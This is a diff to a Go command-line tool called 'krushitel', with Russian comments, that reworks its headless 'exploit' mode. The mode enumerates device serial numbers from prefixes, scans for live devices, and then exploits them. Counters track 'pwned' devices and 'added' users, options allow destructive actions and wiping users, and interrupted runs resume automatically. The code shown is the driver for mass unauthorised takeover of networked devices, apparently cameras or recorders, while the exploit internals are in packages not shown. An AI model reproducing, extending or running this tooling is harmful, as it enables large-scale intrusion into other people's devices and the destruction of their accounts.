@@ -2,19 +2,24 @@ package main
 
 // headless — CLI-режим без TUI:
 //
-//	krushitel -i serials.txt -m exploit -o papkabebra1337 -t 30
+//	krushitel -i 4C6B9E8C2D -m exploit -o papkabebra1337 -t 30
+//	krushitel -i prefixs.txt -m exploit
 //	krushitel -i results.txt -m titles
 //
+// exploit — основной режим в два круга: вход = префикс(ы) (инлайн или
+// файл) и/или серийник(и). [1/2] скан: живые серийники держатся В
+// ОПЕРАТИВНОЙ ПАМЯТИ; краш/прерывание force-пишет в папку результатов
+// crashscan.json (позиция + момент) и crashscan.txt (найденное) —
+// следующий запуск доезжает с позиции. [2/2] крушим найденных.
 // stdout — минималистичный формат (баннер, started, saving, прогресс,
 // [!] err для ошибок СОФТА, finished). Весь сетевой шум и per-serial
 // события — только в log.txt рядом с результатами. config.json тот же,
 // результаты те же (results/done/nostun, session-маркер для resume).
-// Ctrl+C = esc в TUI: session-маркер остаётся, следующий запуск продолжит.
+// Ctrl+C = esc в TUI: чекпоинт/маркер остаются, следующий запуск продолжит.
 
 import (
 	"context"
 	"encoding/binary"
-	"encoding/json"
 	"flag"
 	"fmt"
 	"net"
@@ -98,8 +103,8 @@ func cloudAlive() bool {
 
 func headlessUsage() {
 	fmt.Print(`krushitel headless:
-  -i, --input FILE     входной файл (exploit: серийники; titles: results.txt)
-  -m, --mode MODE      exploit (по умолчанию) | titles | scan | ironscan
+  -i, --input FILE     вход (exploit: префикс(ы)/серийник(и) — файл или инлайн; titles: results.txt)
+  -m, --mode MODE      exploit (по умолчанию) | titles | ironscan
   -p, --port PORT      порт для ironscan (по умолчанию 37777)
   -o, --output DIR     папка результатов (по умолчанию — имя входного файла)
   -t, --threads N      потоки (по умолчанию 30)
@@ -157,10 +162,10 @@ func runHeadless() bool {
 		out("[i] using last input: %s", *inFile)
 	}
 	if *inFile == "" {
-		out("[!] err: нужен -i/--input (файл серийников или results.txt для titles)")
+		out("[!] err: нужен -i/--input (префиксы/серийники или results.txt для titles)")
 		os.Exit(2)
 	}
-	if *mode != "exploit" && *mode != "titles" && *mode != "scan" && *mode != "ironscan" {
+	if *mode != "exploit" && *mode != "titles" && *mode != "ironscan" {
 		out("[!] err: неизвестный режим %q — доступен exploit | titles | scan | ironscan", *mode)
 		os.Exit(2)
 	}
@@ -223,8 +228,6 @@ func runHeadless() bool {
 		os.Exit(runHeadlessExploit(cfg, *inFile, *outDir, *threads, *fresh, progress, renderDone))
 	case "titles":
 		os.Exit(runHeadlessTitles(cfg, *inFile, *threads, progress, renderDone))
-	case "scan":
-		os.Exit(runHeadlessScan(cfg, *inFile, *outDir, *threads, progress, renderDone))
 	case "ironscan":
 		os.Exit(runHeadlessIronScan(cfg, *inFile, *outDir, *threads, *port, progress, renderDone))
 	}
@@ -574,80 +577,47 @@ func wireHooks(cfg ui.Settings) func() {
 	}
 }
 
-// resumeFilter — повтор логики TUI: живой session-маркер + done.txt =
-// продолжаем с необработанных. Возвращает (serials, resume).
-func resumeFilter(serials []string, outDir string, fresh bool) ([]string, bool) {
-	if fresh {
-		return serials, false
-	}
-	data, err := os.ReadFile(filepath.Join(outDir, exploit.SessionFile))
-	if err != nil {
-		return serials, false
-	}
-	var sess struct {
-		InFile string `json:"in_file"`
-	}
-	if json.Unmarshal(data, &sess) != nil || sess.InFile == "" {
-		return serials, false
-	}
-	done := make(map[string]struct{})
-	if d, err := os.ReadFile(filepath.Join(outDir, exploit.DoneFile)); err == nil {
-		for _, line := range strings.Split(string(d), "\n") {
-			if s := ironscan.SanitizeSerial(line); s != "" {
-				done[s] = struct{}{}
-			}
-		}
-	}
-	if len(done) == 0 {
-		return serials, false
-	}
-	remaining := make([]string, 0, len(serials))
-	for _, s := range serials {
-		if _, ok := done[s]; !ok {
-			remaining = append(remaining, s)
-		}
-	}
-	flog("resume: прошлый прогон %q, отработано %d — продолжаем с %d", sess.InFile, len(done), len(remaining))
-	return remaining, true
-}
-
+// runHeadlessExploit — основной режим: вход = префикс(ы) и/или серийник(и)
+// (файл или инлайн через -i). Есть префиксы → два круга: [1/2] скан (живые
+// только в RAM; краш = crashscan.json/txt в папке результатов, следующий
+// запуск доезжает с позиции) → [2/2] крушим найденных. Только серийники —
+// сразу бой, без скан-фазы.
 func runHeadlessExploit(cfg ui.Settings, inFile, outDir string, threads int, fresh bool,
 	progress func(done, total int64, hits string), renderDone func(done, total int64, hits string)) int {
-	serials, serr := exploit.LoadSerials(inFile)
-	if serr != nil || len(serials) == 0 {
-		// файла нет (или пуст) — пробуем инлайн: серийник или список
-		// через запятую/точку с запятой, как в scan/ironscan
-		var inline []string
-		seen := map[string]struct{}{}
-		for _, part := range strings.FieldsFunc(inFile, func(r rune) bool {
-			return r == ',' || r == ';' || r == ' ' || r == '\t'
-		}) {
-			if sn := ironscan.SanitizeSerial(part); sn != "" {
-				if _, ok := seen[sn]; !ok {
-					seen[sn] = struct{}{}
-					inline = append(inline, sn)
-				}
-			}
-		}
-		if serr == nil && len(serials) > 0 {
-			// файл есть и непуст — инлайн не пробуем
-			inline = nil
-		}
-		if len(inline) == 0 {
-			if serr != nil {
-				out("[!] err: входной файл: %v", serr)
-			} else {
-				out("[!] err: файл пуст или серийников не нашлось")
-			}
-			return 2
-		}
-		serials = inline
+
+	prefixes, direct, lerr := exploit.LoadTargetInput(inFile)
+	if lerr != nil {
+		out("[!] err: %v", lerr)
+		return 2
 	}
+	_, isFile := os.Stat(inFile)
 	if outDir == "" {
-		outDir = strings.TrimSuffix(filepath.Base(inFile), filepath.Ext(inFile))
+		if len(prefixes) > 0 && isFile != nil {
+			// инлайн-ввод — имя папки из префикса
+			if len(prefixes) == 1 {
+				outDir = "prefix_" + prefixes[0]
+			} else {
+				outDir = fmt.Sprintf("prefixes_%d", len(prefixes))
+			}
+		} else {
+			outDir = strings.TrimSuffix(filepath.Base(inFile), filepath.Ext(inFile))
+		}
 	}
 	if threads <= 0 {
 		threads = 30
+	}
+
+	headlessBanner(true)
+
+	// r/m ДО создания папки: MkdirAll/log.txt ниже создают её сами —
+	// вопрос «already exists» после них срабатывал даже на свежем прогоне
+	rewrite := headlessAskRewrite(outDir, true)
+	if rewrite {
+		for _, f := range []string{exploit.ResultsFile, exploit.DoneFile, exploit.NoStunFile, exploit.SessionFile,
+			exploit.AliveFile, exploit.CrashScanJSON, exploit.CrashScanTXT} {
+			_ = os.Remove(filepath.Join(outDir, f))
+		}
+		fresh = true
 	}
 
 	_ = os.MkdirAll(outDir, 0755)
@@ -656,54 +626,40 @@ func runHeadlessExploit(cfg ui.Settings, inFile, outDir string, threads int, fre
 	unhook := wireHooks(cfg)
 	defer unhook()
 
-	headlessBanner(true)
-	out("started exploiting %d SNs", len(serials))
+	scanTotal := int64(len(prefixes)) * scanner.SuffixCombos
+	if len(prefixes) > 0 {
+		noun := "prefixes"
+		if len(prefixes) == 1 {
+			noun = "prefix"
+		}
+		out("started exploiting %d %s | %d serials", len(prefixes), noun, scanTotal)
+	} else {
+		out("started exploiting %d SNs", len(direct))
+	}
 	out("saving results at //%s", outDir)
 	ui.RememberRun(inFile, outDir, threads)
 
-	rewrite := headlessAskRewrite(outDir, true)
-	if rewrite {
-		for _, f := range []string{exploit.ResultsFile, exploit.DoneFile, exploit.NoStunFile, exploit.SessionFile} {
-			_ = os.Remove(filepath.Join(outDir, f))
-		}
-		fresh = true
-	}
-
-	// серийники, уже стоящие у нас в results.txt, повторно не крутим —
-	// реэксплойт только пересаживает лишних юзеров и плодит дубли
-	pwnedBefore := map[string]struct{}{}
-	if data, rerr := os.ReadFile(filepath.Join(outDir, exploit.ResultsFile)); rerr == nil {
-		for _, line := range strings.Split(string(data), "\n") {
-			if i := strings.IndexByte(line, ','); i > 0 {
-				if sn := ironscan.SanitizeSerial(line[:i]); sn != "" {
-					pwnedBefore[sn] = struct{}{}
-				}
+	// resume-семантика: живой session-маркер + непустая ведомость done.txt.
+	// Фильтрация по done.txt/results.csv — внутри RunExploitPhase.
+	resume := false
+	if !fresh {
+		if sess := exploit.ReadSession(outDir); sess != nil {
+			if done := exploit.ReadDoneSet(filepath.Join(outDir, exploit.DoneFile)); len(done) > 0 {
+				resume = true
+				flog("resume: прошлый прогон %q, отработано %d", sess.InFile, len(done))
 			}
 		}
 	}
-	remaining, resume := resumeFilter(serials, outDir, fresh)
-	if !fresh && len(pwnedBefore) > 0 {
-		kept := remaining[:0]
-		for _, sn := range remaining {
-			if _, ok := pwnedBefore[sn]; !ok {
-				kept = append(kept, sn)
-			}
-		}
-		if d := len(remaining) - len(kept); d > 0 {
-			remaining = kept
-			fmt.Printf("[%s] already in results: %d serial(s) skipped\n", time.Now().Format("15:04"), d)
-		}
-	}
 
-	// session-маркер: живёт до чистого завершения (движок удалит)
-	sess, _ := json.Marshal(struct {
-		InFile  string `json:"in_file"`
-		Threads int    `json:"threads"`
-		Total   int    `json:"total"`
-		Started string `json:"started"`
-	}{inFile, threads, len(remaining), time.Now().Format("02.01.2006 15:04:05")})
-	_ = os.MkdirAll(outDir, 0755)
-	_ = os.WriteFile(filepath.Join(outDir, exploit.SessionFile), sess, 0644)
+	// session-маркер: живёт до чистого завершения (движок удалит).
+	// Prefixes — по ним resume узнаёт свои alive.txt/crashscan.json.
+	exploit.WriteSession(outDir, exploit.SessionInfo{
+		InFile:   inFile,
+		Threads:  threads,
+		Total:    len(prefixes) + len(direct),
+		Started:  time.Now().Format("02.01.2006 15:04:05"),
+		Prefixes: prefixes,
+	})
 
 	// глобальный лимит одновременных P2P-init'ов — паритет с TUI
 	fwd.InitLimit = 100
@@ -711,7 +667,14 @@ func runHeadlessExploit(cfg ui.Settings, inFile, outDir string, threads int, fre
 	ctx, stop := headlessSignals()
 	defer stop()
 
-	stats := &exploit.Stats{}
+	tp := &exploit.TwoPhaseStats{
+		Scan:        &scanner.ScanStats{},
+		Exp:         &exploit.Stats{},
+		PrefixCount: len(prefixes),
+		DirectCount: len(direct),
+		ScanTotal:   scanTotal,
+	}
+
 	events := make(chan string, 1024)
 	doneEvents := make(chan struct{})
 	go func() {
@@ -719,20 +682,52 @@ func runHeadlessExploit(cfg ui.Settings, inFile, outDir string, threads int, fre
 			flog("%s", line)
 		}
 	}()
+
+	// заголовки фаз на stdout: движок гонит фазы внутри, сюда — шапки
+	go func() {
+		prev := int32(0)
+		for {
+			select {
+			case <-doneEvents:
+				return
+			case <-time.After(100 * time.Millisecond):
+				p := atomic.LoadInt32(&tp.Phase)
+				if p == prev {
+					continue
+				}
+				// шапки фаз — только когда есть префиксы (чистый серийник
+				// без скан-фазы идёт по-старому, без [1/2]/[2/2])
+				if p == 1 {
+					out("[1/2] scanning %d serials", scanTotal)
+				}
+				if p == 2 && len(prefixes) > 0 {
+					out("[2/2] exploiting %d serials", tp.TargetCount())
+				}
+				prev = p
+			}
+		}
+	}()
+
 	go func() {
 		ticker := time.NewTicker(500 * time.Millisecond)
 		defer ticker.Stop()
 		for {
 			select {
 			case <-ticker.C:
-				progress(stats.Processed, stats.Total, fmt.Sprintf("pwned: %d · added: %d", stats.Pwned, stats.Added))
+				if atomic.LoadInt32(&tp.Phase) == 1 {
+					progress(atomic.LoadInt64(&tp.Scan.PrefixDone), int64(len(prefixes)),
+						fmt.Sprintf("found: %d", tp.FoundCount()))
+				} else {
+					progress(tp.Exp.Processed, tp.Exp.Total,
+						fmt.Sprintf("pwned: %d · added: %d", tp.Exp.Pwned, tp.Exp.Added))
+				}
 			case <-doneEvents:
 				return
 			}
 		}
 	}()
 
-	exploit.RunExploit(ctx, remaining, outDir, threads, exploit.Opts{
+	exploit.RunPrefixExploit(ctx, prefixes, direct, outDir, threads, exploit.Opts{
 		OutDir:      outDir,
 		Snaps:       cfg.Snaps,
 		XML:         cfg.XML,
@@ -745,19 +740,34 @@ func runHeadlessExploit(cfg ui.Settings, inFile, outDir string, threads int, fre
 		Resume:      resume,
 		Destructive: cfg.Destructive,
 		WipeUsers:   cfg.WipeUsers,
-	}, stats, events)
+	}, tp, events)
 
 	close(doneEvents)
 	close(events)
-	renderDone(stats.Processed, stats.Total, fmt.Sprintf("pwned: %d · added: %d", stats.Pwned, stats.Added))
+	if tp.PhaseNum() == 1 {
+		// прервались в скане — финальная строка по скан-фазе
+		renderDone(atomic.LoadInt64(&tp.Scan.PrefixDone), int64(len(prefixes)),
+			fmt.Sprintf("found: %d", tp.FoundCount()))
+	} else {
+		renderDone(tp.Exp.Processed, tp.Exp.Total,
+			fmt.Sprintf("pwned: %d · added: %d", tp.Exp.Pwned, tp.Exp.Added))
+	}
 
-	if stats.ErrorMsg != "" {
-		out("[!] err: %s", stats.ErrorMsg)
+	if msg := tp.Scan.ErrorMsg; msg != "" {
+		out("[!] err: scan: %s", msg)
+		return 1
+	}
+	if msg := tp.Exp.ErrorMsg; msg != "" {
+		out("[!] err: %s", msg)
 		return 1
 	}
 	out("exploit finished")
 	if ctx.Err() != nil {
-		flog("прервано: session-маркер сохранён, следующий запуск продолжит")
+		if tp.PhaseNum() == 1 {
+			flog("прервано в скане: session-маркер и чекпоинт сохранены, следующий запуск продолжит с позиции")
+		} else {
+			flog("прервано: session-маркер сохранён, следующий запуск продолжит")
+		}
 		return 130
 	}
 	return 0
@@ -828,97 +838,6 @@ func runHeadlessTitles(cfg ui.Settings, inFile string, threads int,
 		return 1
 	}
 	out("titles finished")
-	if ctx.Err() != nil {
-		return 130
-	}
-	return 0
-}
-
-// runHeadlessScan — префиксный скан: -i файл с префиксами (>=10 символов,
-// берутся первые 10) или одиночный префикс; -o файл живых серийников.
-func runHeadlessScan(cfg ui.Settings, inFile, outFile string, threads int,
-	progress func(done, total int64, hits string), renderDone func(done, total int64, hits string)) int {
-	var prefixes []string
-	if _, err := os.Stat(inFile); err == nil {
-		data, rerr := os.ReadFile(inFile)
-		if rerr != nil {
-			out("[!] err: входной файл: %v", rerr)
-			return 2
-		}
-		for _, line := range strings.Split(string(data), "\n") {
-			line = strings.TrimSpace(line)
-			if len(line) >= 10 {
-				prefixes = append(prefixes, line[:10])
-			}
-		}
-	} else if t := strings.TrimSpace(inFile); len(t) >= 10 {
-		prefixes = []string{t[:10]}
-	} else {
-		out("[!] err: входной файл с префиксами не найден: %s", inFile)
-		return 2
-	}
-	if len(prefixes) == 0 {
-		out("[!] err: префиксов в файле нет (нужно >= 10 символов, берутся первые 10)")
-		return 2
-	}
-	if outFile == "" {
-		outFile = strings.TrimSuffix(filepath.Base(inFile), filepath.Ext(inFile)) + "_alive.txt"
-	}
-	if threads <= 0 {
-		threads = 30
-	}
-
-	appendMode := !headlessAskRewrite(outFile, false)
-	headlessLogOpen(strings.TrimSuffix(outFile, filepath.Ext(outFile)) + ".log")
-	scanner.Debug = cfg.Debug
-	scanner.LogHook = func(line string) { flog("%s", line) }
-	defer func() { scanner.LogHook = nil }()
-
-	headlessBanner(true)
-	totalSNs := int64(len(prefixes)) * 1048576
-	out("started scanning %d prefixes | %d SNs", len(prefixes), totalSNs)
-	out("saving results at //%s", outFile)
-
-	// недобитый скан? чекпоинт в <outFile>.state — продолжаем
-	if info, ok := scanner.CheckPrefixResume(outFile); ok {
-		flog("resume скана: %s", info)
-	}
-
-	ctx, stop := headlessSignals()
-	defer stop()
-
-	stats := &scanner.ScanStats{}
-	events := make(chan string, 1024)
-	doneEvents := make(chan struct{})
-	go func() {
-		for line := range events {
-			flog("%s", line)
-		}
-	}()
-	go func() {
-		ticker := time.NewTicker(500 * time.Millisecond)
-		defer ticker.Stop()
-		for {
-			select {
-			case <-ticker.C:
-				progress(stats.Checked, stats.Total, fmt.Sprintf("found: %d", stats.Alive))
-			case <-doneEvents:
-				return
-			}
-		}
-	}()
-
-	scanner.RunPrefixes(ctx, prefixes, outFile, appendMode, false, threads, stats, events)
-
-	close(doneEvents)
-	close(events)
-	renderDone(stats.Checked, stats.Total, fmt.Sprintf("found: %d", stats.Alive))
-
-	if stats.ErrorMsg != "" {
-		out("[!] err: %s", stats.ErrorMsg)
-		return 1
-	}
-	out("scan finished")
 	if ctx.Err() != nil {
 		return 130
 	}
